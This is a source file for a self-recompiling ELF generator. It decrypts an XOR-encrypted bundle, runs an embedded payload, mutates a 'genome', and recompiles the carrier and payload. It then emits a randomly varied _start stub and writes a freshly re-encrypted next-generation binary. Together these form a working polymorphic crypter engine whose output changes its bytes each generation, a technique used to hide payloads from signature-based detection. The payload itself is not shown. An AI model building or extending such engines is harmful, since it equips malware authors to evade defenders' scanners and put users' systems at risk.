// recomp_elf.mc — Self-recompiling ELF program
// Includes the compiler library + genome mutation, adds ELF builder + main entry.
// Compiled to recomp_elf.mcb, embedded in standalone self-recompiling ELF binaries.

#include "../../compiler/backend/backend_mystc.mc"
#include "recomp_common.mc"
#include "../preloader_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. ELF Assembly (assemble_elf_mc)
//   2. Recompilation Entry (main)
// =============================================================================

// =============================================================================
//
// ELF Assembly Module
//
// Static ELF32 builder. The compiled MCB uses __syscall to invoke the kernel
// directly, so the only preamble bytes ahead of user code are a polymorphic
// _start stub (zero EBP; call main; exit with main's return value).
//
// =============================================================================

// Assemble a complete static ELF32 from components.
// _start stub goes before user code in .text.
// Returns malloc'd buffer. Sets *out_size.
char* assemble_elf_mc(char* code, int code_size, struct Buffer* wrappers,
                       int start_stub_offset, int start_call_fixup,
                       char* data, int data_size,
                       int entry_offset, int* out_size) {
    int load_base;
    int page_align;
    int header_sz;
    int preamble_size;
    int total_code;
    int text_raw;
    int data_raw;
    int text_vaddr;
    int data_vaddr;
    int text_foff;
    int data_foff;
    int entry_vma;
    int phnum;
    int file_size;
    char* elf;
    int wp;
    int i;
    int main_off;
    int call_site;

    load_base = 0x08048000;
    page_align = 0x1000;
    header_sz = 0x200;
    preamble_size = wrappers->len;

    // Patch _start call to main
    main_off = preamble_size + entry_offset;
    call_site = start_call_fixup;
    write_i32(wrappers->data, start_call_fixup, main_off - (call_site + 4));

    total_code = preamble_size + code_size;
    text_raw = align_up(total_code, page_align);
    data_raw = align_up(data_size, 0x200);
    if (data_raw == 0 && data_size > 0) { data_raw = 0x200; }
    text_vaddr = load_base + header_sz;
    data_vaddr = text_vaddr + align_up(total_code, page_align);
    text_foff = header_sz;
    data_foff = header_sz + text_raw;
    entry_vma = text_vaddr + start_stub_offset;
    phnum = 1;
    if (data_size > 0) { phnum = 2; }

    file_size = header_sz + text_raw + data_raw;
    elf = malloc(file_size);
    mem_set(elf, 0, file_size);

    // ELF ident (16 bytes)
    elf[0] = 0x7F; elf[1] = 69; elf[2] = 76; elf[3] = 70;  // \x7fELF
    elf[4] = 1; elf[5] = 1; elf[6] = 1;  // class32, LE, version

    // ELF header fields (36 bytes at offset 16)
    wp = 16;
    write_i16(elf, wp, 2);          // e_type = ET_EXEC
    write_i16(elf, wp + 2, 3);     // e_machine = EM_386
    write_i32(elf, wp + 4, 1);     // e_version
    write_i32(elf, wp + 8, entry_vma);  // e_entry
    write_i32(elf, wp + 12, 52);   // e_phoff
    write_i16(elf, wp + 24, 52);   // e_ehsize
    write_i16(elf, wp + 26, 32);   // e_phentsize
    write_i16(elf, wp + 28, phnum); // e_phnum
    write_i16(elf, wp + 30, 40);   // e_shentsize

    // PT_LOAD for .text (RX)
    wp = 52;
    write_i32(elf, wp, 1);           // p_type = PT_LOAD
    write_i32(elf, wp + 4, text_foff);
    write_i32(elf, wp + 8, text_vaddr);
    write_i32(elf, wp + 12, text_vaddr);  // p_paddr
    write_i32(elf, wp + 16, total_code);
    write_i32(elf, wp + 20, total_code);
    write_i32(elf, wp + 24, 5);     // PF_R|PF_X
    write_i32(elf, wp + 28, page_align);

    if (data_size > 0) {
        // PT_LOAD for .data (RW)
        wp = 84;
        write_i32(elf, wp, 1);
        write_i32(elf, wp + 4, data_foff);
        write_i32(elf, wp + 8, data_vaddr);
        write_i32(elf, wp + 12, data_vaddr);
        write_i32(elf, wp + 16, data_size);
        write_i32(elf, wp + 20, data_size);
        write_i32(elf, wp + 24, 6);  // PF_R|PF_W
        write_i32(elf, wp + 28, page_align);
    }

    // Write .text: wrappers + user code
    mem_copy(elf + text_foff, wrappers->data, preamble_size);
    mem_copy(elf + text_foff + preamble_size, code, code_size);

    // Write .data
    if (data_size > 0) {
        mem_copy(elf + data_foff, data, data_size);
    }

    *out_size = file_size;
    return elf;
}

// =============================================================================
//
// Recompilation Entry Module
//
// Self-recompile body for the standalone ELF: decrypts the bundle, mutates
// the genome, recompiles backend.mcb, builds and writes a fresh ELF to a.out.
//
// =============================================================================

int main() {
    char* pay_data;
    int pay_size;
    int genome_size;
    char* genome_copy;
    struct CompileOutput out1;
    struct CompileOutput out_pay;
    char* pay_mcb_out;
    int   pay_mcb_out_sz;
    int flags;
    int result;
    char out_path[260];
    int bundle_area_off;
    char* new_data;

    init_io();

    // genome_size MUST be set since it's used for the gen-N+1 .data layout
    // (not reassigned by recomp_prep_and_compile).
    {
        int gen_sz;
        if (g_bundle_header == 0) { exit(1); return 1; }
        bundle_get(g_bundle_header, BC_GENOME, &gen_sz);
        genome_size = gen_sz;
    }

    recomp_parse_cmdline(&flags, out_path, "a.out");

    print("Output: ");
    print(out_path);
    print("\nFlags: ");
    print_int(flags);
    print("\n");

    // Decrypt bundle in place: needed both for the pre-mutation payload run
    // and to peek at the genome's temperature byte for a deterministic seed.
    // bundle_open zeroes header.key on success — the later
    // recomp_prep_and_compile call sees key=0 and skips its own decrypt.
    {
        char* pay_ptr;
        int pay_sz;
        char* gen_ptr;
        int gen_sz;
        int seed_val;
        if (bundle_open(g_bundle_header) == 0) { print("FAIL\n"); exit(1); return 1; }
        pay_ptr = bundle_get(g_bundle_header, BC_PAYLOAD, &pay_sz);
        gen_ptr = bundle_get(g_bundle_header, BC_GENOME,  &gen_sz);
        compile_and_run_payload(pay_ptr, pay_sz, gen_ptr, gen_sz);
        seed_val = gen_ptr[6] * 1000 + 12345;
        result = recomp_prep_and_compile(flags | CF_ABS_ELF | CF_EMIT_MC | CF_CDECL_EXTERNS,
                                         seed_val,
                                         &out1, &genome_copy,
                                         &pay_data, &pay_size);
    }
    if (result != 0) { print("FAIL\n"); exit(1); return 1; }

    // Recompile payload .mcb (if present) under the mutated genome so the
    // next-gen bundle carries freshly-transformed bytecode. Parallels
    // recomp_pe.mc — only the embedded .mcb is needed (CF_EMIT_MC), no
    // abs-mode output.
    out_pay.bin_data = 0; out_pay.bin_size = 0;
    out_pay.mc_data  = 0; out_pay.mc_size  = 0;
    pay_mcb_out    = pay_data;
    pay_mcb_out_sz = pay_size;
    if (pay_size > 0) {
        char* pay_mc_with_genome;
        int   pay_mc_with_genome_sz;
        int   pay_result;
        // Save backend state — compile_main clobbers g_mod / g_func_offsets /
        // g_global_offsets, which the assembly path below still needs (e.g.
        // find_global_offset_by_name("g_bundle_header")).
        struct Module* saved_mod;
        int* saved_func_offsets;
        int* saved_global_offsets;
        saved_mod = g_mod;
        saved_func_offsets = g_func_offsets;
        saved_global_offsets = g_global_offsets;

        print("--- Recompiling payload ---\n");
        pay_mc_with_genome_sz = pay_size + genome_size;
        pay_mc_with_genome = malloc(pay_mc_with_genome_sz);
        mem_copy(pay_mc_with_genome, pay_data, pay_size);
        if (genome_size > 0) {
            mem_copy(pay_mc_with_genome + pay_size, genome_copy, genome_size);
        }
        pay_result = compile_main(0, pay_mc_with_genome, pay_mc_with_genome_sz,
                                  flags | CF_ABS_ELF | CF_EMIT_MC | CF_CDECL_EXTERNS
                                        | build_flags_from_genome(genome_copy, genome_size),
                                  &out_pay);
        free(pay_mc_with_genome);
        if (pay_result == 0 && out_pay.mc_size > 0) {
            pay_mcb_out    = out_pay.mc_data;
            pay_mcb_out_sz = out_pay.mc_size;
            print("  payload mcb=");
            print_int(out_pay.mc_size);
            print("\n");
        } else {
            print("  payload recompile failed; forwarding original .mcb\n");
        }

        // Restore backend state so the gen-N+1 .data layout (which references
        // out1's globals via find_global_offset_by_name) lines up.
        g_mod = saved_mod;
        g_func_offsets = saved_func_offsets;
        g_global_offsets = saved_global_offsets;
    }

    // Build next-gen ELF from abs output
    {
        int new_entry_off;
        int new_code_size;
        int new_data_size;
        int new_n_df;
        int new_n_ef;
        int new_n_cf;
        int new_n_ff;
        int hdr_off;
        int df_start;
        int ef_start;
        int cf_start;
        int ff_start;
        int code_start;
        int data_start_off;
        char* new_code;
        char* new_data_compiled;
        int bundle_total;
        int total_data_sz;
        int ii;
        int fix_code_off;
        int fix_data_off;
        int load_base;
        int page_align;
        int header_sz;
        int text_vaddr;
        int data_vaddr;
        int preamble_sz;
        struct Buffer* sc_wrappers;
        int start_stub_off;
        int start_call_fix;
        int recomp_off;
        char* elf_buf;
        int elf_buf_sz;
        int header_align_pad;
        int header_n_desc;
        int header_total;
        int header_area_off;
        int bundle_key;

        new_entry_off  = read_i32(out1.bin_data, 0);
        new_code_size  = read_i32(out1.bin_data, 4);
        new_data_size  = read_i32(out1.bin_data, 8);
        new_n_df       = read_i32(out1.bin_data, 12);
        new_n_ef       = read_i32(out1.bin_data, 16);
        new_n_cf       = read_i32(out1.bin_data, 20);
        new_n_ff       = read_i32(out1.bin_data, 24);

        hdr_off = ABS_HEADER_SIZE;
        df_start = hdr_off;
        ef_start = df_start + new_n_df * 8;
        cf_start = ef_start + new_n_ef * 8;
        ff_start = cf_start + new_n_cf * 8;
        code_start = ff_start + new_n_ff * 8;
        data_start_off = code_start + new_code_size;

        new_code = out1.bin_data + code_start;
        new_data_compiled = out1.bin_data + data_start_off;

        // Build .data: [compiled data][mcb][payload][genome][META header]
        bundle_total = out1.mc_size + pay_mcb_out_sz + genome_size;

        // Reserve room for BundleHeader + descriptors right after the bundle
        // area. Pad to 4-alignment so int loads in bundle_open/bundle_get hit
        // aligned addresses.
        bundle_area_off = new_data_size;
        header_align_pad = (4 - ((bundle_area_off + bundle_total) & 3)) & 3;
        header_n_desc = 1;                                                       // BC_CARRIER
        if (pay_size > 0) { header_n_desc = header_n_desc + 1; }                  // BC_PAYLOAD
        header_n_desc = header_n_desc + 1;                                       // BC_GENOME
        header_total = 32 + header_n_desc * 16;
        header_area_off = bundle_area_off + bundle_total + header_align_pad;

        total_data_sz = new_data_size + bundle_total + header_align_pad + header_total;
        new_data = malloc(total_data_sz + 256);
        mem_set(new_data, 0, total_data_sz + 256);
        mem_copy(new_data, new_data_compiled, new_data_size);
        mem_copy(new_data + bundle_area_off, out1.mc_data, out1.mc_size);
        mem_copy(new_data + bundle_area_off + out1.mc_size, pay_mcb_out, pay_mcb_out_sz);
        mem_copy(new_data + bundle_area_off + out1.mc_size + pay_mcb_out_sz, genome_copy, genome_size);

        // XOR-encrypt the bundle area (carrier/payload/genome) with a fresh
        // per-generation key. bundle_open() decrypts in place on next launch.
        bundle_key = runtime_seed();
        if (bundle_key == 0) { bundle_key = 0x12345678; }
        bundle_xor(new_data + bundle_area_off, bundle_total, bundle_key);

        // Polymorphic _start stub (~12-28 bytes): zero EBP per ABI, call main,
        // transfer return value to EBX, exit via INT 0x80.
        // Variants: poly_zero_reg EBP (4 forms), result-transfer (3 forms:
        // MOV EBX,EAX | XCHG EAX,EBX | PUSH EAX..POP EBX), poly_load_imm EAX 1 (5 forms).
        sc_wrappers = buf_new(64);
        start_stub_off = 0;
        // XOR EBP, EBP (or equivalent) — 4 forms.
        sc_wrappers->len = poly_zero_reg(sc_wrappers->data, sc_wrappers->len, 5);
        // CALL main (rel32, disp patched after layout is known).
        sc_wrappers->data[sc_wrappers->len] = 0xE8; sc_wrappers->len = sc_wrappers->len + 1;
        start_call_fix = sc_wrappers->len;
        write_i32(sc_wrappers->data, sc_wrappers->len, 0);
        sc_wrappers->len = sc_wrappers->len + 4;
        // Result transfer: EAX (return) → EBX (exit arg) and load EAX = 1 (SYS_exit).
        {
            int rf;
            rf = prng_range(3);
            if (rf == 0) {
                // MOV EBX, EAX ; poly_load_imm EAX, 1
                sc_wrappers->data[sc_wrappers->len] = 0x89; sc_wrappers->len = sc_wrappers->len + 1;
                sc_wrappers->data[sc_wrappers->len] = 0xC3; sc_wrappers->len = sc_wrappers->len + 1;
                sc_wrappers->len = poly_load_imm(sc_wrappers->data, sc_wrappers->len, 0, 1);
            } else if (rf == 1) {
                // XCHG EAX, EBX (1B; old EBX is dead at _start) ; poly_load_imm EAX, 1
                sc_wrappers->data[sc_wrappers->len] = 0x93; sc_wrappers->len = sc_wrappers->len + 1;
                sc_wrappers->len = poly_load_imm(sc_wrappers->data, sc_wrappers->len, 0, 1);
            } else {
                // PUSH EAX ; poly_load_imm EAX, 1 ; POP EBX
                sc_wrappers->data[sc_wrappers->len] = 0x50; sc_wrappers->len = sc_wrappers->len + 1;
                sc_wrappers->len = poly_load_imm(sc_wrappers->data, sc_wrappers->len, 0, 1);
                sc_wrappers->data[sc_wrappers->len] = 0x5B; sc_wrappers->len = sc_wrappers->len + 1;
            }
        }
        // INT 0x80
        sc_wrappers->data[sc_wrappers->len] = 0xCD; sc_wrappers->len = sc_wrappers->len + 1;
        sc_wrappers->data[sc_wrappers->len] = 0x80; sc_wrappers->len = sc_wrappers->len + 1;

        preamble_sz = sc_wrappers->len;

        // Compute layout for fixup resolution
        load_base = 0x08048000;
        page_align = 0x1000;
        header_sz = 0x200;
        text_vaddr = load_base + header_sz;
        data_vaddr = text_vaddr + align_up(preamble_sz + new_code_size, page_align);

        // Resolve data fixups
        ii = 0;
        while (ii < new_n_df) {
            fix_code_off = read_i32(out1.bin_data, df_start + ii * 8);
            fix_data_off = read_i32(out1.bin_data, df_start + ii * 8 + 4);
            write_i32(new_code, fix_code_off, data_vaddr + fix_data_off);
            ii = ii + 1;
        }

        // No extern fixups expected — stdlib calls the kernel via __syscall directly,
        // and harmless externs are not enabled for ELF recompilation.

        // Emit BundleHeader + descriptors. Header is plaintext; base_addr is
        // the absolute VA of the bundle area where carrier/payload/genome
        // bytes live, and key holds the XOR key written above so bundle_open()
        // decrypts in place on next-gen launch.
        {
            int hdi; int hboff;
            write_i32(new_data, header_area_off +  0, META_MAGIC);
            write_i32(new_data, header_area_off +  4, META_VERSION);
            write_i32(new_data, header_area_off +  8, header_total);
            write_i32(new_data, header_area_off + 12, header_n_desc);
            write_i32(new_data, header_area_off + 16, data_vaddr + bundle_area_off);
            write_i32(new_data, header_area_off + 20, bundle_total);
            write_i32(new_data, header_area_off + 24, bundle_key);
            write_i32(new_data, header_area_off + 28, 0);
            hdi = 0;
            hboff = 0;
            write_i32(new_data, header_area_off + 32 + hdi*16 +  0, BC_CARRIER);
            write_i32(new_data, header_area_off + 32 + hdi*16 +  4, hboff);
            write_i32(new_data, header_area_off + 32 + hdi*16 +  8, out1.mc_size);
            write_i32(new_data, header_area_off + 32 + hdi*16 + 12, 0);
            hdi = hdi + 1; hboff = hboff + out1.mc_size;
            if (pay_mcb_out_sz > 0) {
                write_i32(new_data, header_area_off + 32 + hdi*16 +  0, BC_PAYLOAD);
                write_i32(new_data, header_area_off + 32 + hdi*16 +  4, hboff);
                write_i32(new_data, header_area_off + 32 + hdi*16 +  8, pay_mcb_out_sz);
                write_i32(new_data, header_area_off + 32 + hdi*16 + 12, 0);
                hdi = hdi + 1; hboff = hboff + pay_mcb_out_sz;
            }
            write_i32(new_data, header_area_off + 32 + hdi*16 +  0, BC_GENOME);
            write_i32(new_data, header_area_off + 32 + hdi*16 +  4, hboff);
            write_i32(new_data, header_area_off + 32 + hdi*16 +  8, genome_size);
            write_i32(new_data, header_area_off + 32 + hdi*16 + 12, 0);
        }

        // Patch g_bundle_header in new .data → absolute VA of the header
        {
            int bundle_header_goff;
            bundle_header_goff = find_global_offset_by_name("g_bundle_header");
            if (bundle_header_goff >= 0) {
                write_i32(new_data, bundle_header_goff,
                          data_vaddr + header_area_off);
            }
        }

        recomp_off = new_entry_off;

        // _start calls main
        // Patch the _start stub's call target
        {
            int main_target;
            main_target = preamble_sz + recomp_off;
            write_i32(sc_wrappers->data, start_call_fix, main_target - (start_call_fix + 4));
        }

        // Assemble ELF
        elf_buf = assemble_elf_mc(new_code, new_code_size, sc_wrappers,
                                   start_stub_off, start_call_fix,
                                   new_data, total_data_sz,
                                   recomp_off, &elf_buf_sz);

        // Write output
        {
            int fd;
            fd = open(out_path, 1);
            if (fd >= 0) {
                write(fd, elf_buf, elf_buf_sz);
                close(fd);
                print("Generated: ");
                print(out_path);
                print("\n");
            } else {
                print("Cannot write output\n");
            }
        }

        free(elf_buf);
        free(new_data);
        free(sc_wrappers->data); free(sc_wrappers);
    }

    free(genome_copy);
    if (out1.bin_data != 0) { free(out1.bin_data); }
    if (out1.mc_data != 0) { free(out1.mc_data); }

    print("=== Done ===\n");
    exit(0);
    return 0;
}
